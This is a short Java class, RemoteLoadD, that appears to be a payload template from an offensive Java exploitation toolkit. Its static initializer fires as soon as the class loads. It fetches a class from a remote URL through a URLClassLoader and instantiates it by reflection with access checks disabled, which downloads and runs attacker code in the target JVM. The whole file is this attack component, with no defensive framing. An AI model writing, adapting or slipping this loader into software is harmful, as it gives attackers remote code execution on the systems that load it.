package com.ppp.utils;

/**
 * @author Whoopsunix
 */
public class RemoteLoadD {
    private static String url;

    private static String className;

    private static Object param;

    static {
        try {
            java.net.URL u = new java.net.URL(url);
            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{u});
            Class<?> loadedClass = classLoader.loadClass(className);
            java.lang.reflect.Constructor constructor = loadedClass.getDeclaredConstructor(param.getClass());
            constructor.setAccessible(true);
            Object object = constructor.newInstance(param);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
